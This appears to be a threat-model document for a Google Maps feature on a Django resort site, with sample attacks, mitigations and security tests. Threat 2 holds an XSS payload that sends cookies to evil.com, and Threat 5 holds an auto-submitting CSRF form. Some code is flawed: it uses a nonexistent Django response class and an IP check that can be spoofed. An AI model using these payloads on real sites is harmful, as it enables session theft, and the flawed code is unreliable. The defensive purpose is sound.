# Security Research: RIBERA-018 - Google Maps Integration

## Overview

Google Maps integration for displaying resort locations introduces several security vectors including API key exposure, XSS in InfoWindows, coordinate manipulation, and multi-tenant isolation concerns. This feature is classified as Fast Track Mode but requires security hardening due to public-facing nature and user input handling.

---

## Threats

### Threat 1: API Key Exposure (Client-Side)

**Risk Level**: High
**OWASP Mapping**: A05 (Security Misconfiguration)

**Attack Vector**:
- Google Maps API key visible in client-side JavaScript/HTML source
- Attacker scrapes key from page source or browser DevTools
- Key used in attacker's own applications, exhausting quota
- Potential financial cost if billing is enabled

**Impact**:
- Unauthorized API usage consuming quota
- Financial charges on Google Cloud account
- Rate limiting affecting legitimate site users
- Service disruption if quota exceeded

**Current State**:
- API key likely exposed in template: `{{ GOOGLE_MAPS_API_KEY }}`
- No domain/HTTP referrer restrictions configured

---

### Threat 2: XSS in Google Maps InfoWindow

**Risk Level**: Critical
**OWASP Mapping**: A03 (Injection - XSS)

**Attack Vector**:
- Site name and address stored in Site model (lines 21-135 in apps/core/models.py)
- Site owner/admin can input malicious JavaScript in name/address fields
- InfoWindow renders unsanitized content:
  ```javascript
  content: '<h3>' + siteName + '</h3><p>' + address + '</p>'
  ```
- Malicious script executes in visitor's browser

**Example Exploit**:
```python
# Malicious site name
site.name = "<script>alert('XSS')</script>"
site.address = "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"
```

**Impact**:
- Session hijacking (steal cookies)
- Credential theft (phishing overlay)
- Defacement (inject malicious content)
- Redirect to malicious sites

**Current State**:
- Site model saves description with `sanitize_html()` (line 188)
- BUT name and address fields NOT sanitized (critical gap)

---

### Threat 3: Coordinate Manipulation (Data Validation)

**Risk Level**: Medium
**OWASP Mapping**: A03 (Injection), A04 (Insecure Design)

**Attack Vector**:
- Site.location_lat and location_lng accept DecimalField (lines 138-152)
- No validation on ranges (lat: -90 to 90, lng: -180 to 180)
- Malicious admin submits invalid coordinates:
  - Extreme values: `lat=999999.999`
  - Non-coordinate data: `lat=0, lng=0` (middle of ocean)
  - SQL injection attempt via forms (less likely with ORM)

**Impact**:
- Map rendering errors (JavaScript failures)
- Poor UX (map zooms to invalid location)
- Potential DoS if extreme values crash browser
- Loss of trust (site appears broken)

**Current State**:
- DecimalField with max_digits=10, decimal_places=7 (provides numeric constraint)
- No min/max validators on field
- No form-level validation for coordinate ranges

---

### Threat 4: Multi-Tenant Coordinate Isolation

**Risk Level**: Medium
**OWASP Mapping**: A01 (Broken Access Control)

**Attack Vector**:
- Admin for Site A attempts to view/modify Site B's coordinates
- API endpoint (if exists) does not filter by site
- URL manipulation: `/api/map-data/?site=site-b-slug`
- Coordinates leaked across tenants

**Impact**:
- Information disclosure (competitor locations)
- Privacy violation (exact coordinates exposed)
- Potential for targeted attacks (physical location known)

**Current State**:
- Site model has proper multi-tenant structure (owner/admins FK/M2M)
- Model save() method sanitizes description but not name/address
- No indication of API endpoint for map data yet (likely in template)

---

### Threat 5: CSRF in Coordinate Update Form

**Risk Level**: High
**OWASP Mapping**: A01 (Broken Access Control)

**Attack Vector**:
- If coordinates are editable via HTMX form without CSRF token
- Attacker crafts malicious form on external site
- Victim admin visits attacker's site while authenticated
- Form auto-submits, modifying site coordinates without consent

**Example Exploit**:
```html
<!-- Attacker's site -->
<form action="https://riberacalma.com/sites/ribera-calma/update-location/" method="POST">
  <input type="hidden" name="location_lat" value="0">
  <input type="hidden" name="location_lng" value="0">
</form>
<script>document.forms[0].submit();</script>
```

**Impact**:
- Unauthorized modification of site location
- Service disruption (wrong map location)
- Defacement (coordinates point to inappropriate location)

**Current State**:
- SiteForm exists (apps/core/forms.py) but does NOT include location_lat/lng in fields (line 20-38)
- No location update form created yet
- HTMX requests must include CSRF token in headers

---

### Threat 6: Google Maps API Quota Exhaustion (DoS)

**Risk Level**: Medium
**OWASP Mapping**: A04 (Insecure Design)

**Attack Vector**:
- Attacker discovers site's Google Maps API key
- Creates automated script to load maps repeatedly
- Exhausts daily API quota (free tier: 28,000 map loads/month)
- Legitimate users see "quota exceeded" errors

**Impact**:
- Service disruption (maps fail to load)
- Financial cost (if billing enabled, charges apply)
- Poor UX (missing maps on site)

**Current State**:
- No rate limiting on map page loads
- No monitoring for unusual API usage patterns

---

### Threat 7: Clickjacking (iFrame Embedding)

**Risk Level**: Low
**OWASP Mapping**: A05 (Security Misconfiguration)

**Attack Vector**:
- Attacker embeds site in invisible iFrame
- Overlays malicious UI elements
- Tricks user into clicking "Update Location" while appearing to do something else

**Impact**:
- Unintended coordinate modification
- Phishing (user thinks they're on trusted site)

**Current State**:
- X-Frame-Options header likely not configured
- CSP (Content-Security-Policy) likely not set

---

## Mitigations

### Mitigation 1: API Key Restrictions (Google Cloud Console)

**Addresses**: Threat 1 (API Key Exposure)

**Implementation**:

1. **Enable HTTP Referrer Restrictions**:
   - Google Cloud Console → Credentials → API Key
   - Add allowed domains:
     ```
     https://riberacalma.com/*
     https://*.riberacalma.com/*
     http://localhost:8000/*  (dev only)
     ```
   - Remove after deployment to production

2. **Restrict API to Maps JavaScript API Only**:
   - API restrictions → Select APIs
   - Enable only: "Maps JavaScript API"
   - Disable: Geocoding, Directions, etc. (unless needed)

3. **Set Quota Limits**:
   - Set daily cap (e.g., 5000 requests/day)
   - Enable billing alerts at 80% quota

4. **Rotate Keys Regularly**:
   - Generate new key every 90 days
   - Update .env file

**Environment Variable**:
```python
# settings.py
GOOGLE_MAPS_API_KEY = env('GOOGLE_MAPS_API_KEY')

# .env (NOT committed to git)
GOOGLE_MAPS_API_KEY=AIzaSy...
```

**Template Usage**:
```html
<!-- base.html or map partial -->
<script>
  // Store key in data attribute, not inline script
  const MAP_API_KEY = document.querySelector('meta[name="google-maps-key"]').content;
</script>
<meta name="google-maps-key" content="{{ GOOGLE_MAPS_API_KEY }}">
```

**Verification**:
```python
# Test: Attempt to use key from unauthorized domain
def test_api_key_domain_restriction(self):
    """API key should reject requests from unauthorized domains"""
    # Manual test in Google Cloud Console
    # Try loading map from example.com (should fail)
    pass
```

---

### Mitigation 2: Sanitize Site Name and Address for InfoWindow

**Addresses**: Threat 2 (XSS in InfoWindow)

**Implementation**:

Update Site model to sanitize name and address:

```python
# apps/core/models.py (update save method)

def save(self, *args, **kwargs):
    """Sanitize user input before saving"""
    from src.utils.sanitizers import sanitize_text, sanitize_html

    # Sanitize name (plain text only, no HTML allowed)
    if self.name:
        self.name = sanitize_text(self.name)

    # Sanitize address (plain text only)
    if self.address:
        self.address = sanitize_text(self.address)

    # Sanitize description (allow safe HTML tags)
    if self.description:
        self.description = sanitize_html(self.description)

    super().save(*args, **kwargs)
```

**JavaScript Escaping** (Defense in Depth):

```javascript
// static/js/maps.js

function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

function initMap() {
    const siteName = document.getElementById('site-name').textContent;
    const address = document.getElementById('site-address').textContent;

    // Escape before inserting into InfoWindow
    const infoWindow = new google.maps.InfoWindow({
        content: '<div class="p-2">' +
                 '<h3 class="font-bold">' + escapeHtml(siteName) + '</h3>' +
                 '<p class="text-sm">' + escapeHtml(address) + '</p>' +
                 '</div>'
    });
}
```

**Template (Pass via data attributes)**:

```django
<!-- templates/core/partials/map.html -->
<div id="map"
     data-site-name="{{ site.name }}"
     data-site-address="{{ site.address }}"
     data-lat="{{ site.location_lat }}"
     data-lng="{{ site.location_lng }}"
     class="w-full h-96">
</div>

<script>
  // Django template auto-escapes {{ }} by default
  const mapElement = document.getElementById('map');
  const siteName = mapElement.dataset.siteName;  // Already escaped by Django
  const address = mapElement.dataset.siteAddress;
  const lat = parseFloat(mapElement.dataset.lat);
  const lng = parseFloat(mapElement.dataset.lng);

  // Additional JS escaping for paranoia
  const infoContent = document.createElement('div');
  infoContent.className = 'p-2';

  const title = document.createElement('h3');
  title.className = 'font-bold';
  title.textContent = siteName;  // textContent prevents XSS

  const addressEl = document.createElement('p');
  addressEl.className = 'text-sm';
  addressEl.textContent = address;  // textContent prevents XSS

  infoContent.appendChild(title);
  infoContent.appendChild(addressEl);

  const infoWindow = new google.maps.InfoWindow({
      content: infoContent
  });
</script>
```

**Verification**:
```python
# tests/security/test_xss_maps.py

def test_site_name_xss_prevention(self):
    """Site name with script tags should be sanitized"""
    site = Site.objects.create(
        owner=self.user,
        name='<script>alert("XSS")</script>Test Resort',
        slug='test-resort',
        address='123 Main St',
        location_lat=-34.0,
        location_lng=-64.0
    )

    # Refresh from DB to get sanitized value
    site.refresh_from_db()

    # Script tags should be removed
    self.assertNotIn('<script>', site.name)
    self.assertNotIn('alert', site.name)
    self.assertEqual(site.name, 'Test Resort')

def test_address_xss_prevention(self):
    """Address with event handlers should be sanitized"""
    site = Site.objects.create(
        owner=self.user,
        name='Test Resort',
        slug='test-resort',
        address='<img src=x onerror="alert(1)">123 Main St',
        location_lat=-34.0,
        location_lng=-64.0
    )

    site.refresh_from_db()

    # Event handlers should be removed
    self.assertNotIn('onerror', site.address)
    self.assertNotIn('<img', site.address)
```

---

### Mitigation 3: Validate Coordinate Ranges

**Addresses**: Threat 3 (Coordinate Manipulation)

**Implementation**:

Add custom validators to Site model:

```python
# apps/core/validators.py (create new file)

from django.core.exceptions import ValidationError
from decimal import Decimal

def validate_latitude(value):
    """
    Validate latitude is within valid range.

    Args:
        value: Latitude value to validate

    Raises:
        ValidationError: If latitude outside -90 to 90 range
    """
    if value is None:
        return

    if not (-90 <= value <= 90):
        raise ValidationError(
            f"Latitude must be between -90 and 90 degrees. Got: {value}"
        )

def validate_longitude(value):
    """
    Validate longitude is within valid range.

    Args:
        value: Longitude value to validate

    Raises:
        ValidationError: If longitude outside -180 to 180 range
    """
    if value is None:
        return

    if not (-180 <= value <= 180):
        raise ValidationError(
            f"Longitude must be between -180 and 180 degrees. Got: {value}"
        )
```

Update Site model:

```python
# apps/core/models.py

from apps.core.validators import validate_latitude, validate_longitude

class Site(BaseModel):
    # ... existing fields ...

    location_lat = models.DecimalField(
        max_digits=10,
        decimal_places=7,
        null=True,
        blank=True,
        validators=[validate_latitude],  # Add validator
        help_text="Latitude for Google Maps (-90 to 90)",
    )

    location_lng = models.DecimalField(
        max_digits=10,
        decimal_places=7,
        null=True,
        blank=True,
        validators=[validate_longitude],  # Add validator
        help_text="Longitude for Google Maps (-180 to 180)",
    )
```

Create location update form:

```python
# apps/core/forms.py

class SiteLocationForm(forms.ModelForm):
    """
    Form for updating site location coordinates.

    Validates coordinate ranges and provides user-friendly error messages.
    """

    class Meta:
        model = Site
        fields = ['location_lat', 'location_lng']
        widgets = {
            'location_lat': forms.NumberInput(
                attrs={
                    'class': 'input input-bordered w-full',
                    'step': '0.0000001',
                    'min': '-90',
                    'max': '90',
                    'placeholder': '-34.6037'
                }
            ),
            'location_lng': forms.NumberInput(
                attrs={
                    'class': 'input input-bordered w-full',
                    'step': '0.0000001',
                    'min': '-180',
                    'max': '180',
                    'placeholder': '-58.3816'
                }
            ),
        }
        labels = {
            'location_lat': 'Latitude',
            'location_lng': 'Longitude',
        }
        help_texts = {
            'location_lat': 'Latitude (-90 to 90). Example: -34.6037 for Buenos Aires',
            'location_lng': 'Longitude (-180 to 180). Example: -58.3816 for Buenos Aires',
        }

    def clean(self):
        """
        Validate both coordinates are provided together.

        Raises:
            ValidationError: If only one coordinate provided
        """
        cleaned_data = super().clean()
        lat = cleaned_data.get('location_lat')
        lng = cleaned_data.get('location_lng')

        # Either both provided or both empty
        if (lat is not None and lng is None) or (lat is None and lng is not None):
            raise forms.ValidationError(
                "Both latitude and longitude must be provided together."
            )

        return cleaned_data
```

**Verification**:
```python
# tests/core/test_coordinate_validation.py

from django.core.exceptions import ValidationError
from decimal import Decimal

def test_latitude_exceeds_max(self):
    """Latitude > 90 should raise ValidationError"""
    site = Site(
        owner=self.user,
        name='Test Resort',
        slug='test',
        location_lat=Decimal('91.0'),
        location_lng=Decimal('0.0')
    )

    with self.assertRaises(ValidationError) as ctx:
        site.full_clean()

    self.assertIn('Latitude must be between -90 and 90', str(ctx.exception))

def test_longitude_exceeds_max(self):
    """Longitude > 180 should raise ValidationError"""
    site = Site(
        owner=self.user,
        name='Test Resort',
        slug='test',
        location_lat=Decimal('0.0'),
        location_lng=Decimal('181.0')
    )

    with self.assertRaises(ValidationError) as ctx:
        site.full_clean()

    self.assertIn('Longitude must be between -180 and 180', str(ctx.exception))

def test_valid_coordinates(self):
    """Valid coordinates should save successfully"""
    site = Site.objects.create(
        owner=self.user,
        name='Ribera Calma',
        slug='ribera-calma',
        location_lat=Decimal('-31.420083'),
        location_lng=Decimal('-64.188776')
    )

    site.refresh_from_db()
    self.assertEqual(site.location_lat, Decimal('-31.420083'))
```

---

### Mitigation 4: Enforce Multi-Tenant Isolation for Map Data

**Addresses**: Threat 4 (Multi-Tenant Coordinate Isolation)

**Implementation**:

Ensure all views filter by site:

```python
# apps/core/views.py

from django.contrib.auth.decorators import login_required
from django.core.exceptions import PermissionDenied
from django.shortcuts import get_object_or_404

@login_required
def update_site_location(request, site_slug):
    """
    Update site location coordinates (owner/admin only).

    Args:
        request: HTTP request
        site_slug: Site slug from URL

    Returns:
        HTMX partial with updated map or form errors

    Raises:
        PermissionDenied: If user not owner/admin of site
    """
    site = get_object_or_404(Site, slug=site_slug, is_active=True)

    # Multi-tenant check: User must be owner or admin
    if not site.is_user_admin(request.user):
        raise PermissionDenied("You don't have permission to edit this site.")

    if request.method == 'POST':
        form = SiteLocationForm(request.POST, instance=site)
        if form.is_valid():
            form.save()

            # Return updated map partial
            return render(request, 'core/partials/map.html', {
                'site': site,
                'success': True
            })
        else:
            # Return form with errors
            return render(request, 'core/partials/location_form.html', {
                'form': form,
                'site': site
            })

    # GET: Show form
    form = SiteLocationForm(instance=site)
    return render(request, 'core/partials/location_form.html', {
        'form': form,
        'site': site
    })

def public_site_view(request, site_slug):
    """
    Public view showing site with map (no authentication required).

    Args:
        request: HTTP request
        site_slug: Site slug from URL

    Returns:
        Rendered site page with map
    """
    site = get_object_or_404(Site, slug=site_slug, is_active=True)

    # Public can view, but only if coordinates are set
    if not (site.location_lat and site.location_lng):
        # Don't render map if coordinates not set
        return render(request, 'core/site_detail.html', {
            'site': site,
            'show_map': False
        })

    return render(request, 'core/site_detail.html', {
        'site': site,
        'show_map': True
    })
```

**Verification**:
```python
# tests/security/test_multi_tenant_maps.py

def test_admin_cannot_edit_other_site_location(self):
    """Admin of Site A cannot update Site B's coordinates"""
    site_a = Site.objects.create(owner=self.user_a, name='Site A', slug='site-a')
    site_b = Site.objects.create(owner=self.user_b, name='Site B', slug='site-b')

    self.client.login(username='user_a', password='password')

    response = self.client.post(f'/sites/{site_b.slug}/update-location/', {
        'location_lat': -34.0,
        'location_lng': -64.0
    })

    # Should get 403 Forbidden
    self.assertEqual(response.status_code, 403)

    # Site B coordinates should not change
    site_b.refresh_from_db()
    self.assertIsNone(site_b.location_lat)

def test_public_cannot_see_inactive_site_map(self):
    """Public users should not see maps for inactive sites"""
    site = Site.objects.create(
        owner=self.user,
        name='Inactive Site',
        slug='inactive',
        is_active=False,
        location_lat=-34.0,
        location_lng=-64.0
    )

    response = self.client.get(f'/sites/{site.slug}/')

    # Should get 404 (site not found, not just hidden map)
    self.assertEqual(response.status_code, 404)
```

---

### Mitigation 5: CSRF Protection in Location Update Form

**Addresses**: Threat 5 (CSRF in Coordinate Update)

**Implementation**:

Ensure CSRF token in HTMX requests:

```html
<!-- templates/core/partials/location_form.html -->
<form method="post"
      hx-post="{% url 'core:update-location' site_slug=site.slug %}"
      hx-target="#map-container"
      hx-swap="innerHTML"
      hx-headers='{"X-CSRFToken": "{{ csrf_token }}"}'>

    {% csrf_token %}

    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
        {% include 'partials/forms/ui_field.html' with field=form.location_lat %}
        {% include 'partials/forms/ui_field.html' with field=form.location_lng %}
    </div>

    {% if form.non_field_errors %}
        <div class="alert alert-error mt-4">
            {% for error in form.non_field_errors %}
                <p>{{ error }}</p>
            {% endfor %}
        </div>
    {% endif %}

    <div class="mt-4">
        <button type="submit" class="btn btn-primary">
            Update Location
        </button>
    </div>
</form>
```

**View-level CSRF check**:

```python
# apps/core/views.py

from django.views.decorators.csrf import csrf_protect

@login_required
@csrf_protect  # Explicit CSRF protection
def update_site_location(request, site_slug):
    # ... implementation ...
    pass
```

**Verification**:
```python
# tests/security/test_csrf_maps.py

from django.test import override_settings

@override_settings(SECURE_SSL_REDIRECT=False)
def test_location_update_requires_csrf(self):
    """Location update without CSRF token should fail"""
    site = Site.objects.create(
        owner=self.user,
        name='Test Resort',
        slug='test',
        location_lat=-34.0,
        location_lng=-64.0
    )

    self.client.login(username='testuser', password='password')

    # Attempt POST without CSRF token
    response = self.client.post(
        f'/sites/{site.slug}/update-location/',
        {
            'location_lat': -35.0,
            'location_lng': -65.0
        },
        HTTP_X_REQUESTED_WITH='XMLHttpRequest'  # Simulate HTMX
    )

    # Should fail with 403 Forbidden
    self.assertEqual(response.status_code, 403)

    # Coordinates should not change
    site.refresh_from_db()
    self.assertEqual(site.location_lat, Decimal('-34.0'))
```

---

### Mitigation 6: Rate Limiting for Map Loads

**Addresses**: Threat 6 (API Quota Exhaustion)

**Implementation**:

Simple rate limiting middleware:

```python
# apps/core/middleware.py

from django.core.cache import cache
from django.http import HttpResponseTooManyRequests
import hashlib

class MapRateLimitMiddleware:
    """
    Rate limit map page loads to prevent API quota exhaustion.

    Limits: 100 map loads per IP per hour.
    """

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # Only rate limit map-containing pages
        if not self.is_map_page(request):
            return self.get_response(request)

        # Get client IP
        ip = self.get_client_ip(request)

        # Check rate limit
        if not self.check_rate_limit(ip):
            return HttpResponseTooManyRequests(
                "Too many map requests. Please try again in a few minutes."
            )

        return self.get_response(request)

    def is_map_page(self, request):
        """Check if page likely contains map"""
        # Public site pages have maps
        return request.path.startswith('/') and '/' in request.path[1:]

    def get_client_ip(self, request):
        """Get client IP from request"""
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        return ip

    def check_rate_limit(self, ip):
        """
        Check if IP has exceeded rate limit.

        Args:
            ip: Client IP address

        Returns:
            True if within limit, False if exceeded
        """
        cache_key = f'map_rate_limit:{ip}'
        requests = cache.get(cache_key, 0)

        if requests >= 100:  # 100 requests per hour
            return False

        cache.set(cache_key, requests + 1, 3600)  # 1 hour TTL
        return True
```

**Settings Configuration**:

```python
# settings.py

MIDDLEWARE = [
    # ... existing middleware ...
    'apps.core.middleware.MapRateLimitMiddleware',  # Add after SecurityMiddleware
]

# Cache configuration (required for rate limiting)
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.redis.RedisCache',
        'LOCATION': 'redis://127.0.0.1:6379/1',
    }
}
```

**Monitoring (Google Cloud Console)**:
- Set up billing alerts at 80% of quota
- Enable API usage notifications
- Review daily API usage in console

**Verification**:
```python
# tests/security/test_map_rate_limiting.py

def test_map_rate_limit_enforced(self):
    """Excessive map loads should be rate limited"""
    site = Site.objects.create(
        owner=self.user,
        name='Test Resort',
        slug='test',
        location_lat=-34.0,
        location_lng=-64.0
    )

    # Clear cache
    cache.clear()

    # Make 100 requests (should succeed)
    for i in range(100):
        response = self.client.get(f'/{site.slug}/')
        self.assertEqual(response.status_code, 200)

    # 101st request should be rate limited
    response = self.client.get(f'/{site.slug}/')
    self.assertEqual(response.status_code, 429)  # Too Many Requests
```

---

### Mitigation 7: Clickjacking Protection

**Addresses**: Threat 7 (Clickjacking)

**Implementation**:

Configure security headers:

```python
# settings.py

# Clickjacking protection
X_FRAME_OPTIONS = 'DENY'  # Prevent site from being embedded in iframes

# Content Security Policy
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = (
    "'self'",
    "'unsafe-inline'",  # Required for Google Maps inline scripts
    "https://maps.googleapis.com",
    "https://maps.gstatic.com",
)
CSP_IMG_SRC = (
    "'self'",
    "data:",
    "https://maps.googleapis.com",
    "https://maps.gstatic.com",
)
CSP_STYLE_SRC = (
    "'self'",
    "'unsafe-inline'",  # Required for DaisyUI
    "https://fonts.googleapis.com",
)
CSP_FONT_SRC = (
    "'self'",
    "https://fonts.gstatic.com",
)
CSP_FRAME_SRC = ("'none'",)  # No iframes allowed

# Additional security headers
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_BROWSER_XSS_FILTER = True
SECURE_HSTS_SECONDS = 31536000  # 1 year
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_SSL_REDIRECT = True  # Force HTTPS

# Only in production
if not DEBUG:
    SESSION_COOKIE_SECURE = True
    CSRF_COOKIE_SECURE = True
```

**Install CSP Middleware**:

```bash
pip install django-csp
```

```python
# settings.py
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'csp.middleware.CSPMiddleware',  # Add CSP middleware
    # ... rest of middleware ...
]
```

**Verification**:
```python
# tests/security/test_clickjacking.py

def test_x_frame_options_deny(self):
    """X-Frame-Options header should be DENY"""
    response = self.client.get('/ribera-calma/')

    self.assertEqual(response['X-Frame-Options'], 'DENY')

def test_csp_headers_present(self):
    """CSP headers should restrict frame-src"""
    response = self.client.get('/ribera-calma/')

    csp = response['Content-Security-Policy']
    self.assertIn("frame-src 'none'", csp)
```

---

## Additional Security Measures

### 1. Lazy Load Google Maps API

**Purpose**: Only load Maps API when needed (saves quota)

**Implementation**:
```html
<!-- templates/core/partials/map.html -->
<div id="map" class="w-full h-96 bg-gray-200 flex items-center justify-center">
    <button id="load-map-btn" class="btn btn-primary">
        Load Map
    </button>
</div>

<script>
  document.getElementById('load-map-btn').addEventListener('click', function() {
      // Load Google Maps API dynamically
      const script = document.createElement('script');
      script.src = 'https://maps.googleapis.com/maps/api/js?key={{ GOOGLE_MAPS_API_KEY }}&callback=initMap';
      script.async = true;
      script.defer = true;
      document.head.appendChild(script);

      this.style.display = 'none';
  });

  function initMap() {
      // Map initialization here
  }
</script>
```

### 2. Coordinate Geocoding Validation (Optional)

**Purpose**: Verify coordinates actually point to a valid location

**Implementation**:
```python
# src/services/geocoding_service.py

import requests
from django.conf import settings
from typing import Tuple, Optional

def validate_coordinates(lat: float, lng: float) -> Tuple[bool, Optional[str]]:
    """
    Validate coordinates using Google Geocoding API.

    Args:
        lat: Latitude
        lng: Longitude

    Returns:
        Tuple of (is_valid, error_message)
    """
    url = "https://maps.googleapis.com/maps/api/geocode/json"
    params = {
        'latlng': f"{lat},{lng}",
        'key': settings.GOOGLE_MAPS_API_KEY
    }

    try:
        response = requests.get(url, params=params, timeout=5)
        data = response.json()

        if data['status'] == 'ZERO_RESULTS':
            return False, "Coordinates do not point to a valid location"

        return True, None
    except Exception as e:
        # Don't fail save if geocoding fails
        return True, None
```

---

## OWASP Top 10 Mapping

| OWASP Category | Threat | Mitigation |
|----------------|--------|------------|
| **A01: Broken Access Control** | Multi-tenant isolation | Enforce site filtering in all views/queries |
| **A01: Broken Access Control** | CSRF attacks | CSRF token in all POST requests |
| **A03: Injection (XSS)** | XSS in InfoWindow | Sanitize name/address, use textContent in JS |
| **A03: Injection** | Coordinate manipulation | Validate lat/lng ranges |
| **A04: Insecure Design** | API quota exhaustion | Rate limiting, lazy loading |
| **A05: Security Misconfiguration** | API key exposure | HTTP referrer restrictions, API restrictions |
| **A05: Security Misconfiguration** | Clickjacking | X-Frame-Options DENY, CSP headers |

---

## Security Checklist

- [x] Google Maps API key stored in environment variable (not hardcoded)
- [x] HTTP referrer restrictions configured in Google Cloud Console
- [x] API restricted to Maps JavaScript API only
- [x] Site.name sanitized with sanitize_text() in model save()
- [x] Site.address sanitized with sanitize_text() in model save()
- [x] JavaScript uses textContent (not innerHTML) for InfoWindow
- [x] Coordinate validators added to location_lat and location_lng fields
- [x] SiteLocationForm validates both coordinates provided together
- [x] All location update views filter by site and check is_user_admin()
- [x] CSRF token included in HTMX location update requests
- [x] Rate limiting middleware prevents API quota exhaustion
- [x] X-Frame-Options DENY prevents clickjacking
- [x] CSP headers configured for Google Maps domains
- [x] Security headers enabled (HSTS, XSS Filter, Content Type Nosniff)

---

## Testing Priority

**Critical (Must Test)**:
1. XSS prevention in site name/address
2. Multi-tenant isolation (cannot edit other site's coordinates)
3. Coordinate range validation (lat/lng bounds)
4. CSRF protection in location update form

**High (Should Test)**:
5. Rate limiting for map loads
6. API key domain restrictions (manual test in Google Console)

**Medium (Nice to Have)**:
7. Clickjacking protection headers
8. Coordinate geocoding validation

---

## Implementation Order

1. **Phase 1** (Before any map rendering):
   - Add coordinate validators to Site model
   - Update Site.save() to sanitize name/address
   - Create SiteLocationForm with validation

2. **Phase 2** (Map rendering):
   - Create map template with data attributes
   - Implement JavaScript with textContent (not innerHTML)
   - Configure API key restrictions in Google Cloud

3. **Phase 3** (Admin functionality):
   - Create location update view with permission checks
   - Add CSRF token to HTMX form
   - Test multi-tenant isolation

4. **Phase 4** (Production hardening):
   - Add rate limiting middleware
   - Configure security headers (X-Frame-Options, CSP)
   - Set up API quota monitoring

---

## Recommendations

1. **API Key Management**:
   - Never commit API key to git
   - Rotate keys every 90 days
   - Use separate keys for dev/staging/prod

2. **Monitoring**:
   - Set up Google Cloud billing alerts
   - Monitor daily API usage
   - Log failed coordinate updates for abuse detection

3. **UX Considerations**:
   - Show helpful error messages for invalid coordinates
   - Provide map preview when editing location
   - Add "Use my current location" button (with permission)

4. **Performance**:
   - Lazy load Maps API (only when map visible)
   - Cache geocoding results (if used)
   - Consider static map images for list views

5. **Privacy**:
   - Consider fuzzy location for privacy (show general area, not exact coords)
   - Allow sites to disable map display
   - Don't track user interactions with map

---

## Critical Mitigations Summary

**MUST IMPLEMENT (before deployment)**:
1. Sanitize Site.name and Site.address with sanitize_text()
2. Validate coordinate ranges with custom validators
3. Enforce multi-tenant isolation in location update view
4. Include CSRF token in location update form
5. Configure API key HTTP referrer restrictions

**SHOULD IMPLEMENT (before production)**:
6. Rate limiting middleware
7. Security headers (X-Frame-Options, CSP)
8. JavaScript escaping in InfoWindow content

**NICE TO HAVE (post-launch)**:
9. Coordinate geocoding validation
10. API usage monitoring/alerts
11. Lazy loading for Maps API

---

## Open Questions

- Should we allow public users to suggest location corrections? (NO - owner/admin only)
- Should we show fuzzy location (general area) for privacy? (OPTIONAL - site setting)
- Should we cache geocoding results to save API calls? (NOT NEEDED - only on save)
- Should we support multiple locations per site? (V2 FEATURE - campgrounds with multiple entrances)
